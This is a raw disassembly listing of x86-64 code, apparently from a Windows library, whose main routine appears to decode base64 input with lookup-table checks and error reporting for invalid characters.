    6d8c9589:	48 8b 05 10 f2 0e 00 	mov    0xef210(%rip),%rax        # 0x6d9b87a0
    6d8c9590:	48 89 07             	mov    %rax,(%rdi)
    6d8c9593:	48 8d 05 66 95 00 00 	lea    0x9566(%rip),%rax        # 0x6d8d2b00
    6d8c959a:	48 89 47 10          	mov    %rax,0x10(%rdi)
    6d8c959e:	42 0f b6 4c 33 10    	movzbl 0x10(%rbx,%r14,1),%ecx
    6d8c95a4:	e8 37 7f ff ff       	call   0x6d8c14e0
    6d8c95a9:	4c 89 f1             	mov    %r14,%rcx
    6d8c95ac:	48 89 c5             	mov    %rax,%rbp
    6d8c95af:	e8 2c 7f ff ff       	call   0x6d8c14e0
    6d8c95b4:	31 d2                	xor    %edx,%edx
    6d8c95b6:	48 85 ed             	test   %rbp,%rbp
    6d8c95b9:	49 89 c5             	mov    %rax,%r13
    6d8c95bc:	74 04                	je     0x6d8c95c2
    6d8c95be:	48 8b 55 00          	mov    0x0(%rbp),%rdx
    6d8c95c2:	31 c0                	xor    %eax,%eax
    6d8c95c4:	4d 85 ed             	test   %r13,%r13
    6d8c95c7:	74 04                	je     0x6d8c95cd
    6d8c95c9:	49 8b 45 00          	mov    0x0(%r13),%rax
    6d8c95cd:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c95d2:	e8 7d a9 ff ff       	call   0x6d8c3f54
    6d8c95d7:	48 8d 15 22 96 00 00 	lea    0x9622(%rip),%rdx        # 0x6d8d2c00
    6d8c95de:	48 89 c1             	mov    %rax,%rcx
    6d8c95e1:	49 89 c1             	mov    %rax,%r9
    6d8c95e4:	e8 45 f9 ff ff       	call   0x6d8c8f2e
    6d8c95e9:	42 8a 54 33 10       	mov    0x10(%rbx,%r14,1),%dl
    6d8c95ee:	49 8b 01             	mov    (%r9),%rax
    6d8c95f1:	4c 89 c9             	mov    %r9,%rcx
    6d8c95f4:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c95f9:	48 8d 15 e0 95 00 00 	lea    0x95e0(%rip),%rdx        # 0x6d8d2be0
    6d8c9600:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9606:	48 ff c0             	inc    %rax
    6d8c9609:	49 89 01             	mov    %rax,(%r9)
    6d8c960c:	e8 1d f9 ff ff       	call   0x6d8c8f2e
    6d8c9611:	48 89 ea             	mov    %rbp,%rdx
    6d8c9614:	4c 89 c9             	mov    %r9,%rcx
    6d8c9617:	e8 38 f9 ff ff       	call   0x6d8c8f54
    6d8c961c:	48 8d 15 9d 95 00 00 	lea    0x959d(%rip),%rdx        # 0x6d8d2bc0
    6d8c9623:	4c 89 c9             	mov    %r9,%rcx
    6d8c9626:	e8 03 f9 ff ff       	call   0x6d8c8f2e
    6d8c962b:	4c 89 ea             	mov    %r13,%rdx
    6d8c962e:	4c 89 c9             	mov    %r9,%rcx
    6d8c9631:	e8 1e f9 ff ff       	call   0x6d8c8f54
    6d8c9636:	48 8d 15 63 95 00 00 	lea    0x9563(%rip),%rdx        # 0x6d8d2ba0
    6d8c963d:	4c 89 c9             	mov    %r9,%rcx
    6d8c9640:	e8 e9 f8 ff ff       	call   0x6d8c8f2e
    6d8c9645:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
    6d8c9649:	4c 89 ca             	mov    %r9,%rdx
    6d8c964c:	e8 8f f8 ff ff       	call   0x6d8c8ee0
    6d8c9651:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
    6d8c9655:	31 d2                	xor    %edx,%edx
    6d8c9657:	e8 84 f8 ff ff       	call   0x6d8c8ee0
    6d8c965c:	4c 8d 0d a8 94 00 00 	lea    0x94a8(%rip),%r9        # 0x6d8d2b0b
    6d8c9663:	48 89 f9             	mov    %rdi,%rcx
    6d8c9666:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c966d:	00 00 
    6d8c966f:	4c 8d 05 a0 94 00 00 	lea    0x94a0(%rip),%r8        # 0x6d8d2b16
    6d8c9676:	48 8d 15 83 94 00 00 	lea    0x9483(%rip),%rdx        # 0x6d8d2b00
    6d8c967d:	e8 75 b0 ff ff       	call   0x6d8c46f7
    6d8c9682:	49 8d 6e 01          	lea    0x1(%r14),%rbp
    6d8c9686:	0f b6 44 2b 10       	movzbl 0x10(%rbx,%rbp,1),%eax
    6d8c968b:	45 0f b6 24 04       	movzbl (%r12,%rax,1),%r12d
    6d8c9690:	4c 89 e0             	mov    %r12,%rax
    6d8c9693:	fe c0                	inc    %al
    6d8c9695:	0f 85 0a 01 00 00    	jne    0x6d8c97a5
    6d8c969b:	48 8b 0d 9e f0 0e 00 	mov    0xef09e(%rip),%rcx        # 0x6d9b8740
    6d8c96a2:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c96a7:	e8 a9 a7 ff ff       	call   0x6d8c3e55
    6d8c96ac:	48 89 c7             	mov    %rax,%rdi
    6d8c96af:	48 8b 05 ea f0 0e 00 	mov    0xef0ea(%rip),%rax        # 0x6d9b87a0
    6d8c96b6:	48 89 07             	mov    %rax,(%rdi)
    6d8c96b9:	48 8d 05 40 94 00 00 	lea    0x9440(%rip),%rax        # 0x6d8d2b00
    6d8c96c0:	48 89 47 10          	mov    %rax,0x10(%rdi)
    6d8c96c4:	0f b6 4c 2b 10       	movzbl 0x10(%rbx,%rbp,1),%ecx
    6d8c96c9:	e8 12 7e ff ff       	call   0x6d8c14e0
    6d8c96ce:	48 89 e9             	mov    %rbp,%rcx
    6d8c96d1:	49 89 c5             	mov    %rax,%r13
    6d8c96d4:	e8 07 7e ff ff       	call   0x6d8c14e0
    6d8c96d9:	31 d2                	xor    %edx,%edx
    6d8c96db:	4d 85 ed             	test   %r13,%r13
    6d8c96de:	49 89 c6             	mov    %rax,%r14
    6d8c96e1:	74 04                	je     0x6d8c96e7
    6d8c96e3:	49 8b 55 00          	mov    0x0(%r13),%rdx
    6d8c96e7:	31 c0                	xor    %eax,%eax
    6d8c96e9:	4d 85 f6             	test   %r14,%r14
    6d8c96ec:	74 03                	je     0x6d8c96f1
    6d8c96ee:	49 8b 06             	mov    (%r14),%rax
    6d8c96f1:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c96f6:	e8 59 a8 ff ff       	call   0x6d8c3f54
    6d8c96fb:	48 8d 15 fe 94 00 00 	lea    0x94fe(%rip),%rdx        # 0x6d8d2c00
    6d8c9702:	48 89 c1             	mov    %rax,%rcx
    6d8c9705:	49 89 c1             	mov    %rax,%r9
    6d8c9708:	e8 21 f8 ff ff       	call   0x6d8c8f2e
    6d8c970d:	8a 54 2b 10          	mov    0x10(%rbx,%rbp,1),%dl
    6d8c9711:	49 8b 01             	mov    (%r9),%rax
    6d8c9714:	4c 89 c9             	mov    %r9,%rcx
    6d8c9717:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c971c:	48 8d 15 bd 94 00 00 	lea    0x94bd(%rip),%rdx        # 0x6d8d2be0
    6d8c9723:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9729:	48 ff c0             	inc    %rax
    6d8c972c:	49 89 01             	mov    %rax,(%r9)
    6d8c972f:	e8 fa f7 ff ff       	call   0x6d8c8f2e
    6d8c9734:	4c 89 ea             	mov    %r13,%rdx
    6d8c9737:	4c 89 c9             	mov    %r9,%rcx
    6d8c973a:	e8 15 f8 ff ff       	call   0x6d8c8f54
    6d8c973f:	48 8d 15 7a 94 00 00 	lea    0x947a(%rip),%rdx        # 0x6d8d2bc0
    6d8c9746:	4c 89 c9             	mov    %r9,%rcx
    6d8c9749:	e8 e0 f7 ff ff       	call   0x6d8c8f2e
    6d8c974e:	4c 89 f2             	mov    %r14,%rdx
    6d8c9751:	4c 89 c9             	mov    %r9,%rcx
    6d8c9754:	e8 fb f7 ff ff       	call   0x6d8c8f54
    6d8c9759:	48 8d 15 40 94 00 00 	lea    0x9440(%rip),%rdx        # 0x6d8d2ba0
    6d8c9760:	4c 89 c9             	mov    %r9,%rcx
    6d8c9763:	e8 c6 f7 ff ff       	call   0x6d8c8f2e
    6d8c9768:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
    6d8c976c:	4c 89 ca             	mov    %r9,%rdx
    6d8c976f:	e8 6c f7 ff ff       	call   0x6d8c8ee0
    6d8c9774:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
    6d8c9778:	31 d2                	xor    %edx,%edx
    6d8c977a:	e8 61 f7 ff ff       	call   0x6d8c8ee0
    6d8c977f:	4c 8d 0d 85 93 00 00 	lea    0x9385(%rip),%r9        # 0x6d8d2b0b
    6d8c9786:	48 89 f9             	mov    %rdi,%rcx
    6d8c9789:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c9790:	00 00 
    6d8c9792:	4c 8d 05 7d 93 00 00 	lea    0x937d(%rip),%r8        # 0x6d8d2b16
    6d8c9799:	48 8d 15 60 93 00 00 	lea    0x9360(%rip),%rdx        # 0x6d8d2b00
    6d8c97a0:	e8 52 af ff ff       	call   0x6d8c46f7
    6d8c97a5:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
    6d8c97aa:	c1 e6 02             	shl    $0x2,%esi
    6d8c97ad:	49 c1 fc 04          	sar    $0x4,%r12
    6d8c97b1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    6d8c97b6:	41 09 f4             	or     %esi,%r12d
    6d8c97b9:	48 ff 44 24 38       	incq   0x38(%rsp)
    6d8c97be:	44 88 64 38 10       	mov    %r12b,0x10(%rax,%rdi,1)
    6d8c97c3:	e9 c4 03 00 00       	jmp    0x6d8c9b8c
    6d8c97c8:	42 0f b6 44 33 10    	movzbl 0x10(%rbx,%r14,1),%eax
    6d8c97ce:	48 8d 2d 6b 94 00 00 	lea    0x946b(%rip),%rbp        # 0x6d8d2c40
    6d8c97d5:	40 8a 7c 05 00       	mov    0x0(%rbp,%rax,1),%dil
    6d8c97da:	40 80 ff ff          	cmp    $0xff,%dil
    6d8c97de:	0f 85 0d 01 00 00    	jne    0x6d8c98f1
    6d8c97e4:	48 8b 0d 55 ef 0e 00 	mov    0xeef55(%rip),%rcx        # 0x6d9b8740
    6d8c97eb:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c97f0:	e8 60 a6 ff ff       	call   0x6d8c3e55
    6d8c97f5:	48 89 c6             	mov    %rax,%rsi
    6d8c97f8:	48 8b 05 a1 ef 0e 00 	mov    0xeefa1(%rip),%rax        # 0x6d9b87a0
    6d8c97ff:	48 89 06             	mov    %rax,(%rsi)
    6d8c9802:	48 8d 05 f7 92 00 00 	lea    0x92f7(%rip),%rax        # 0x6d8d2b00
    6d8c9809:	48 89 46 10          	mov    %rax,0x10(%rsi)
    6d8c980d:	42 0f b6 4c 33 10    	movzbl 0x10(%rbx,%r14,1),%ecx
    6d8c9813:	e8 c8 7c ff ff       	call   0x6d8c14e0
    6d8c9818:	4c 89 f1             	mov    %r14,%rcx
    6d8c981b:	49 89 c4             	mov    %rax,%r12
    6d8c981e:	e8 bd 7c ff ff       	call   0x6d8c14e0
    6d8c9823:	31 d2                	xor    %edx,%edx
    6d8c9825:	4d 85 e4             	test   %r12,%r12
    6d8c9828:	49 89 c5             	mov    %rax,%r13
    6d8c982b:	74 04                	je     0x6d8c9831
    6d8c982d:	49 8b 14 24          	mov    (%r12),%rdx
    6d8c9831:	31 c0                	xor    %eax,%eax
    6d8c9833:	4d 85 ed             	test   %r13,%r13
    6d8c9836:	74 04                	je     0x6d8c983c
    6d8c9838:	49 8b 45 00          	mov    0x0(%r13),%rax
    6d8c983c:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c9841:	e8 0e a7 ff ff       	call   0x6d8c3f54
    6d8c9846:	48 8d 15 b3 93 00 00 	lea    0x93b3(%rip),%rdx        # 0x6d8d2c00
    6d8c984d:	48 89 c1             	mov    %rax,%rcx
    6d8c9850:	49 89 c1             	mov    %rax,%r9
    6d8c9853:	e8 d6 f6 ff ff       	call   0x6d8c8f2e
    6d8c9858:	42 8a 54 33 10       	mov    0x10(%rbx,%r14,1),%dl
    6d8c985d:	49 8b 01             	mov    (%r9),%rax
    6d8c9860:	4c 89 c9             	mov    %r9,%rcx
    6d8c9863:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c9868:	48 8d 15 71 93 00 00 	lea    0x9371(%rip),%rdx        # 0x6d8d2be0
    6d8c986f:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9875:	48 ff c0             	inc    %rax
    6d8c9878:	49 89 01             	mov    %rax,(%r9)
    6d8c987b:	e8 ae f6 ff ff       	call   0x6d8c8f2e
    6d8c9880:	4c 89 e2             	mov    %r12,%rdx
    6d8c9883:	4c 89 c9             	mov    %r9,%rcx
    6d8c9886:	e8 c9 f6 ff ff       	call   0x6d8c8f54
    6d8c988b:	48 8d 15 2e 93 00 00 	lea    0x932e(%rip),%rdx        # 0x6d8d2bc0
    6d8c9892:	4c 89 c9             	mov    %r9,%rcx
    6d8c9895:	e8 94 f6 ff ff       	call   0x6d8c8f2e
    6d8c989a:	4c 89 ea             	mov    %r13,%rdx
    6d8c989d:	4c 89 c9             	mov    %r9,%rcx
    6d8c98a0:	e8 af f6 ff ff       	call   0x6d8c8f54
    6d8c98a5:	48 8d 15 f4 92 00 00 	lea    0x92f4(%rip),%rdx        # 0x6d8d2ba0
    6d8c98ac:	4c 89 c9             	mov    %r9,%rcx
    6d8c98af:	e8 7a f6 ff ff       	call   0x6d8c8f2e
    6d8c98b4:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c98b8:	4c 89 ca             	mov    %r9,%rdx
    6d8c98bb:	e8 20 f6 ff ff       	call   0x6d8c8ee0
    6d8c98c0:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    6d8c98c4:	31 d2                	xor    %edx,%edx
    6d8c98c6:	e8 15 f6 ff ff       	call   0x6d8c8ee0
    6d8c98cb:	4c 8d 0d 39 92 00 00 	lea    0x9239(%rip),%r9        # 0x6d8d2b0b
    6d8c98d2:	48 89 f1             	mov    %rsi,%rcx
    6d8c98d5:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c98dc:	00 00 
    6d8c98de:	4c 8d 05 31 92 00 00 	lea    0x9231(%rip),%r8        # 0x6d8d2b16
    6d8c98e5:	48 8d 15 14 92 00 00 	lea    0x9214(%rip),%rdx        # 0x6d8d2b00
    6d8c98ec:	e8 06 ae ff ff       	call   0x6d8c46f7
    6d8c98f1:	4d 8d 6e 01          	lea    0x1(%r14),%r13
    6d8c98f5:	42 0f b6 44 2b 10    	movzbl 0x10(%rbx,%r13,1),%eax
    6d8c98fb:	0f b6 44 05 00       	movzbl 0x0(%rbp,%rax,1),%eax
    6d8c9900:	3c ff                	cmp    $0xff,%al
    6d8c9902:	48 89 c6             	mov    %rax,%rsi
    6d8c9905:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    6d8c990a:	0f 85 19 01 00 00    	jne    0x6d8c9a29
    6d8c9910:	48 8b 0d 29 ee 0e 00 	mov    0xeee29(%rip),%rcx        # 0x6d9b8740
    6d8c9917:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c991c:	e8 34 a5 ff ff       	call   0x6d8c3e55
    6d8c9921:	49 89 c4             	mov    %rax,%r12
    6d8c9924:	48 8b 05 75 ee 0e 00 	mov    0xeee75(%rip),%rax        # 0x6d9b87a0
    6d8c992b:	49 89 04 24          	mov    %rax,(%r12)
    6d8c992f:	48 8d 05 ca 91 00 00 	lea    0x91ca(%rip),%rax        # 0x6d8d2b00
    6d8c9936:	49 89 44 24 10       	mov    %rax,0x10(%r12)
    6d8c993b:	42 0f b6 4c 2b 10    	movzbl 0x10(%rbx,%r13,1),%ecx
    6d8c9941:	e8 9a 7b ff ff       	call   0x6d8c14e0
    6d8c9946:	4c 89 e9             	mov    %r13,%rcx
    6d8c9949:	49 89 c7             	mov    %rax,%r15
    6d8c994c:	e8 8f 7b ff ff       	call   0x6d8c14e0
    6d8c9951:	31 d2                	xor    %edx,%edx
    6d8c9953:	4d 85 ff             	test   %r15,%r15
    6d8c9956:	49 89 c0             	mov    %rax,%r8
    6d8c9959:	74 03                	je     0x6d8c995e
    6d8c995b:	49 8b 17             	mov    (%r15),%rdx
    6d8c995e:	31 c0                	xor    %eax,%eax
    6d8c9960:	4d 85 c0             	test   %r8,%r8
    6d8c9963:	74 03                	je     0x6d8c9968
    6d8c9965:	49 8b 00             	mov    (%r8),%rax
    6d8c9968:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c996d:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
    6d8c9972:	e8 dd a5 ff ff       	call   0x6d8c3f54
    6d8c9977:	48 8d 15 82 92 00 00 	lea    0x9282(%rip),%rdx        # 0x6d8d2c00
    6d8c997e:	48 89 c1             	mov    %rax,%rcx
    6d8c9981:	49 89 c1             	mov    %rax,%r9
    6d8c9984:	e8 a5 f5 ff ff       	call   0x6d8c8f2e
    6d8c9989:	42 8a 54 2b 10       	mov    0x10(%rbx,%r13,1),%dl
    6d8c998e:	49 8b 01             	mov    (%r9),%rax
    6d8c9991:	4c 89 c9             	mov    %r9,%rcx
    6d8c9994:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c9999:	48 8d 15 40 92 00 00 	lea    0x9240(%rip),%rdx        # 0x6d8d2be0
    6d8c99a0:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c99a6:	48 ff c0             	inc    %rax
    6d8c99a9:	49 89 01             	mov    %rax,(%r9)
    6d8c99ac:	e8 7d f5 ff ff       	call   0x6d8c8f2e
    6d8c99b1:	4c 89 fa             	mov    %r15,%rdx
    6d8c99b4:	4c 89 c9             	mov    %r9,%rcx
    6d8c99b7:	e8 98 f5 ff ff       	call   0x6d8c8f54
    6d8c99bc:	48 8d 15 fd 91 00 00 	lea    0x91fd(%rip),%rdx        # 0x6d8d2bc0
    6d8c99c3:	4c 89 c9             	mov    %r9,%rcx
    6d8c99c6:	e8 63 f5 ff ff       	call   0x6d8c8f2e
    6d8c99cb:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
    6d8c99d0:	4c 89 c9             	mov    %r9,%rcx
    6d8c99d3:	4c 89 c2             	mov    %r8,%rdx
    6d8c99d6:	e8 79 f5 ff ff       	call   0x6d8c8f54
    6d8c99db:	48 8d 15 be 91 00 00 	lea    0x91be(%rip),%rdx        # 0x6d8d2ba0
    6d8c99e2:	4c 89 c9             	mov    %r9,%rcx
    6d8c99e5:	e8 44 f5 ff ff       	call   0x6d8c8f2e
    6d8c99ea:	49 8d 4c 24 18       	lea    0x18(%r12),%rcx
    6d8c99ef:	4c 89 ca             	mov    %r9,%rdx
    6d8c99f2:	e8 e9 f4 ff ff       	call   0x6d8c8ee0
    6d8c99f7:	49 8d 4c 24 08       	lea    0x8(%r12),%rcx
    6d8c99fc:	31 d2                	xor    %edx,%edx
    6d8c99fe:	e8 dd f4 ff ff       	call   0x6d8c8ee0
    6d8c9a03:	4c 8d 0d 01 91 00 00 	lea    0x9101(%rip),%r9        # 0x6d8d2b0b
    6d8c9a0a:	4c 89 e1             	mov    %r12,%rcx
    6d8c9a0d:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c9a14:	00 00 
    6d8c9a16:	4c 8d 05 f9 90 00 00 	lea    0x90f9(%rip),%r8        # 0x6d8d2b16
    6d8c9a1d:	48 8d 15 dc 90 00 00 	lea    0x90dc(%rip),%rdx        # 0x6d8d2b00
    6d8c9a24:	e8 ce ac ff ff       	call   0x6d8c46f7
    6d8c9a29:	4d 8d 66 02          	lea    0x2(%r14),%r12
    6d8c9a2d:	42 0f b6 44 23 10    	movzbl 0x10(%rbx,%r12,1),%eax
    6d8c9a33:	44 0f b6 6c 05 00    	movzbl 0x0(%rbp,%rax,1),%r13d
    6d8c9a39:	4c 89 e8             	mov    %r13,%rax
    6d8c9a3c:	fe c0                	inc    %al
    6d8c9a3e:	0f 85 16 01 00 00    	jne    0x6d8c9b5a
    6d8c9a44:	48 8b 0d f5 ec 0e 00 	mov    0xeecf5(%rip),%rcx        # 0x6d9b8740
    6d8c9a4b:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c9a50:	e8 00 a4 ff ff       	call   0x6d8c3e55
    6d8c9a55:	48 89 c5             	mov    %rax,%rbp
    6d8c9a58:	48 8b 05 41 ed 0e 00 	mov    0xeed41(%rip),%rax        # 0x6d9b87a0
    6d8c9a5f:	48 89 45 00          	mov    %rax,0x0(%rbp)
    6d8c9a63:	48 8d 05 96 90 00 00 	lea    0x9096(%rip),%rax        # 0x6d8d2b00
    6d8c9a6a:	48 89 45 10          	mov    %rax,0x10(%rbp)
    6d8c9a6e:	42 0f b6 4c 23 10    	movzbl 0x10(%rbx,%r12,1),%ecx
    6d8c9a74:	e8 67 7a ff ff       	call   0x6d8c14e0
    6d8c9a79:	4c 89 e1             	mov    %r12,%rcx
    6d8c9a7c:	49 89 c7             	mov    %rax,%r15
    6d8c9a7f:	e8 5c 7a ff ff       	call   0x6d8c14e0
    6d8c9a84:	31 d2                	xor    %edx,%edx
    6d8c9a86:	4d 85 ff             	test   %r15,%r15
    6d8c9a89:	49 89 c0             	mov    %rax,%r8
    6d8c9a8c:	74 03                	je     0x6d8c9a91
    6d8c9a8e:	49 8b 17             	mov    (%r15),%rdx
    6d8c9a91:	31 c0                	xor    %eax,%eax
    6d8c9a93:	4d 85 c0             	test   %r8,%r8
    6d8c9a96:	74 03                	je     0x6d8c9a9b
    6d8c9a98:	49 8b 00             	mov    (%r8),%rax
    6d8c9a9b:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c9aa0:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
    6d8c9aa5:	e8 aa a4 ff ff       	call   0x6d8c3f54
    6d8c9aaa:	48 8d 15 4f 91 00 00 	lea    0x914f(%rip),%rdx        # 0x6d8d2c00
    6d8c9ab1:	48 89 c1             	mov    %rax,%rcx
    6d8c9ab4:	49 89 c1             	mov    %rax,%r9
    6d8c9ab7:	e8 72 f4 ff ff       	call   0x6d8c8f2e
    6d8c9abc:	42 8a 54 23 10       	mov    0x10(%rbx,%r12,1),%dl
    6d8c9ac1:	49 8b 01             	mov    (%r9),%rax
    6d8c9ac4:	4c 89 c9             	mov    %r9,%rcx
    6d8c9ac7:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c9acc:	48 8d 15 0d 91 00 00 	lea    0x910d(%rip),%rdx        # 0x6d8d2be0
    6d8c9ad3:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9ad9:	48 ff c0             	inc    %rax
    6d8c9adc:	49 89 01             	mov    %rax,(%r9)
    6d8c9adf:	e8 4a f4 ff ff       	call   0x6d8c8f2e
    6d8c9ae4:	4c 89 fa             	mov    %r15,%rdx
    6d8c9ae7:	4c 89 c9             	mov    %r9,%rcx
    6d8c9aea:	e8 65 f4 ff ff       	call   0x6d8c8f54
    6d8c9aef:	48 8d 15 ca 90 00 00 	lea    0x90ca(%rip),%rdx        # 0x6d8d2bc0
    6d8c9af6:	4c 89 c9             	mov    %r9,%rcx
    6d8c9af9:	e8 30 f4 ff ff       	call   0x6d8c8f2e
    6d8c9afe:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
    6d8c9b03:	4c 89 c9             	mov    %r9,%rcx
    6d8c9b06:	4c 89 c2             	mov    %r8,%rdx
    6d8c9b09:	e8 46 f4 ff ff       	call   0x6d8c8f54
    6d8c9b0e:	48 8d 15 8b 90 00 00 	lea    0x908b(%rip),%rdx        # 0x6d8d2ba0
    6d8c9b15:	4c 89 c9             	mov    %r9,%rcx
    6d8c9b18:	e8 11 f4 ff ff       	call   0x6d8c8f2e
    6d8c9b1d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
    6d8c9b21:	4c 89 ca             	mov    %r9,%rdx
    6d8c9b24:	e8 b7 f3 ff ff       	call   0x6d8c8ee0
    6d8c9b29:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
    6d8c9b2d:	31 d2                	xor    %edx,%edx
    6d8c9b2f:	e8 ac f3 ff ff       	call   0x6d8c8ee0
    6d8c9b34:	4c 8d 0d d0 8f 00 00 	lea    0x8fd0(%rip),%r9        # 0x6d8d2b0b
    6d8c9b3b:	48 89 e9             	mov    %rbp,%rcx
    6d8c9b3e:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c9b45:	00 00 
    6d8c9b47:	4c 8d 05 c8 8f 00 00 	lea    0x8fc8(%rip),%r8        # 0x6d8d2b16
    6d8c9b4e:	48 8d 15 ab 8f 00 00 	lea    0x8fab(%rip),%rdx        # 0x6d8d2b00
    6d8c9b55:	e8 9d ab ff ff       	call   0x6d8c46f7
    6d8c9b5a:	c1 e7 02             	shl    $0x2,%edi
    6d8c9b5d:	44 0f b6 f6          	movzbl %sil,%r14d
    6d8c9b61:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    6d8c9b66:	c1 e6 04             	shl    $0x4,%esi
    6d8c9b69:	49 c1 fe 04          	sar    $0x4,%r14
    6d8c9b6d:	49 c1 fd 02          	sar    $0x2,%r13
    6d8c9b71:	41 09 fe             	or     %edi,%r14d
    6d8c9b74:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
    6d8c9b79:	41 09 f5             	or     %esi,%r13d
    6d8c9b7c:	48 83 44 24 38 02    	addq   $0x2,0x38(%rsp)
    6d8c9b82:	44 88 74 38 10       	mov    %r14b,0x10(%rax,%rdi,1)
    6d8c9b87:	44 88 6c 38 11       	mov    %r13b,0x11(%rax,%rdi,1)
    6d8c9b8c:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8c9b91:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
    6d8c9b96:	48 83 c4 78          	add    $0x78,%rsp
    6d8c9b9a:	5b                   	pop    %rbx
    6d8c9b9b:	5e                   	pop    %rsi
    6d8c9b9c:	5f                   	pop    %rdi
    6d8c9b9d:	5d                   	pop    %rbp
    6d8c9b9e:	41 5c                	pop    %r12
    6d8c9ba0:	41 5d                	pop    %r13
    6d8c9ba2:	41 5e                	pop    %r14
    6d8c9ba4:	41 5f                	pop    %r15
    6d8c9ba6:	e9 91 a5 ff ff       	jmp    0x6d8c413c
    6d8c9bab:	31 c0                	xor    %eax,%eax
    6d8c9bad:	48 83 c4 78          	add    $0x78,%rsp
    6d8c9bb1:	5b                   	pop    %rbx
    6d8c9bb2:	5e                   	pop    %rsi
    6d8c9bb3:	5f                   	pop    %rdi
    6d8c9bb4:	5d                   	pop    %rbp
    6d8c9bb5:	41 5c                	pop    %r12
    6d8c9bb7:	41 5d                	pop    %r13
    6d8c9bb9:	41 5e                	pop    %r14
    6d8c9bbb:	41 5f                	pop    %r15
    6d8c9bbd:	c3                   	ret
    6d8c9bbe:	90                   	nop
    6d8c9bbf:	90                   	nop
    6d8c9bc0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c9bc4:	48 8d 0d a5 91 00 00 	lea    0x91a5(%rip),%rcx        # 0x6d8d2d70
    6d8c9bcb:	e8 87 ae ff ff       	call   0x6d8c4a57
    6d8c9bd0:	48 85 c0             	test   %rax,%rax
    6d8c9bd3:	48 89 05 06 2c 0f 00 	mov    %rax,0xf2c06(%rip)        # 0x6d9bc7e0
    6d8c9bda:	75 0c                	jne    0x6d8c9be8
    6d8c9bdc:	48 8d 0d 6d 91 00 00 	lea    0x916d(%rip),%rcx        # 0x6d8d2d50
    6d8c9be3:	e8 86 ae ff ff       	call   0x6d8c4a6e
    6d8c9be8:	48 8b 0d f1 2b 0f 00 	mov    0xf2bf1(%rip),%rcx        # 0x6d9bc7e0
    6d8c9bef:	48 8d 15 4a 91 00 00 	lea    0x914a(%rip),%rdx        # 0x6d8d2d40
    6d8c9bf6:	e8 53 af ff ff       	call   0x6d8c4b4e
    6d8c9bfb:	48 89 05 9e 50 10 00 	mov    %rax,0x10509e(%rip)        # 0x6d9ceca0
    6d8c9c02:	48 83 c4 28          	add    $0x28,%rsp
    6d8c9c06:	c3                   	ret
    6d8c9c07:	90                   	nop
    6d8c9c08:	90                   	nop
    6d8c9c09:	90                   	nop
    6d8c9c0a:	90                   	nop
    6d8c9c0b:	90                   	nop
    6d8c9c0c:	90                   	nop
    6d8c9c0d:	90                   	nop
    6d8c9c0e:	90                   	nop
    6d8c9c0f:	90                   	nop
    6d8c9c10:	56                   	push   %rsi
    6d8c9c11:	53                   	push   %rbx
    6d8c9c12:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c9c16:	48 89 d3             	mov    %rdx,%rbx
    6d8c9c19:	e8 1e b0 ff ff       	call   0x6d8c4c3c
    6d8c9c1e:	48 85 c0             	test   %rax,%rax
    6d8c9c21:	74 34                	je     0x6d8c9c57
    6d8c9c23:	4c 8b 10             	mov    (%rax),%r10
    6d8c9c26:	49 89 d9             	mov    %rbx,%r9
    6d8c9c29:	48 89 da             	mov    %rbx,%rdx
    6d8c9c2c:	0f b6 f7             	movzbl %bh,%esi
    6d8c9c2f:	49 c1 f9 10          	sar    $0x10,%r9
    6d8c9c33:	48 c1 fa 18          	sar    $0x18,%rdx
    6d8c9c37:	45 31 c0             	xor    %r8d,%r8d
    6d8c9c3a:	4d 39 d0             	cmp    %r10,%r8
    6d8c9c3d:	7d 18                	jge    0x6d8c9c57
